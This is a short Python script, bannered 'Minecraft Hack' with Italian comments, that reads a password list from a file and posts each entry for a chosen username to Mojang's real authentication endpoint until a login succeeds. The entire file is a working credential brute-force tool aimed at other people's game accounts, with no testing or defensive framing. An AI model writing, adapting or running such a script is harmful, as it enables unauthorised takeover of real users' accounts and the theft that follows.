import argparse
import requests
text = """

<-. (`-')    _     <-. (`-')_  (`-')  _ 
   \(OO )_  (_)       \( OO) ) ( OO).-/ 
,--./  ,-.) ,-(`-'),--./ ,--/ (,------. 
|   `.'   | | ( OO)|   \ |  |  |  .---' 
|  |'.'|  | |  |  )|  . '|  |)(|  '--.  
|  |   |  |(|  |_/ |  |\    |  |  .--'  
|  |   |  | |  |'->|  | \   |  |  `---. 
`--'   `--' `--'   `--'  `--'  `------' 
 (`-').-> (`-')  _           <-.(`-')   
 (OO )__  (OO ).-/  _         __( OO)   
,--. ,'-' / ,---.   \-,-----.'-'. ,--.  
|  | |  | | \ /`.\   |  .--./|  .'   /  
|  `-'  | '-'|_.' | /_) (`-')|      /)  
|  .-.  |(|  .-.  | ||  |OO )|  .   '   
|  | |  | |  | |  |(_'  '--'\|  |\   \   
`--' `--' `--' `--'   `-----'`--' '--' by Davide Cestaro 

"""
print("\u001b[31m" + text + "\u001b[31m")
# Crea un parser per gestire gli argomenti a riga di comando
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--username", help="Inserisci il tuo nome utente", required=True)
args = parser.parse_args()

# Inserisci il nome del file 
password_file = "password.txt"

# Apre il file
with open(password_file, "r") as file:
    # Legge tutte le righe del file
    password_list = file.readlines()

# Crea una sessione per mantenere la connessione
session = requests.Session()

# Effettua la richiesta di login utilizzando ciascuna password in sequenza
for password in password_list:
    password = password.strip()
    login_data = {"username": args.username, "password": password}
    login_url = "https://authserver.mojang.com/authenticate"
    login_response = session.post(login_url, json=login_data)

    # Verifica se il login è stato effettuato con successo
    if login_response.status_code == 200:
        print("Login effettuato con successo utilizzando la password:", password)
        break
    else:
        print("Errore durante il login con la password:", password)
else:
    print("Nessuna delle password fornite ha permesso di effettuare il login.")
